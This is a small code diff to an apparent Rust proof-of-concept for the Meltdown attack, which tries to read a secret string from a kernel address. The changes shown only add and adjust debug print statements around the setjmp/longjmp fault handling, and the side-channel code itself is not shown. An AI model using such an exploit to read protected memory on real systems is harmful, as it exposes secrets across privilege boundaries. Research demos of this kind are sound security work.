@@ -144,6 +144,7 @@ impl SignalHandler for SegfaultHandler {
 // Debugging only, to be replaced by a struct with SignalHandler trait
 pub fn handle_signal() {
 	unsafe {
+		println!("handle_signal");
 		longjmp(&mut *jump_buf.lock(), 1);
 	}
 }
@@ -329,7 +330,7 @@ pub fn main() {
 		secret_string_kernel = String::from_raw_parts(SECRET as *mut u8, secret_string.len(), secret_string.len());
 	}
 	
-	println!("Successfully created string object, trying to read secret...");
+	println!("Successfully created string object at address {:p}, content at {:p}, trying to read secret...", &secret_string_kernel, secret_string_kernel.as_ptr());
 	
 	unsafe {
 		if setjmp(&mut *jump_buf_direct_read.lock()) == 0 {
@@ -341,7 +342,7 @@ pub fn main() {
 		}
 	}
 	
-	print!("Trying to read secret from address {:?} using meltdown...\nExpected:{}\n     Got: ", SECRET, secret_string);
+	print!("Trying to read secret from address {:?} using meltdown...\nExpected: {}\n     Got: ", SECRET, secret_string);
 	
 	let mut index: usize = 0;
 	while index < secret_string.len() {
